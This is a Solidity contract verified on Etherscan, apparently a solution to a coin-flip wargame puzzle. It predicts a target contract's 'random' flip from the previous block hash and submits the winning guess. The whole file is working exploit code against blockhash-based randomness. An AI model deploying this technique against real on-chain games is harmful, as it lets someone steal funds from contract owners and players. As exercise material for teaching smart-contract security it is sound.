/**
 *Submitted for verification at Etherscan.io on 2021-09-11
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;


contract CoinFlipInterface {
   function flip(bool _guess) public returns (bool){}
}

contract HackCoinFlip {
    CoinFlipInterface coinFlipContract = CoinFlipInterface(0xE9611acE3165360ceC6Cf0D60bC9f33E91B8C4ec);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function hackFlip() public {
        // pre-deteremine the flip outcome
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}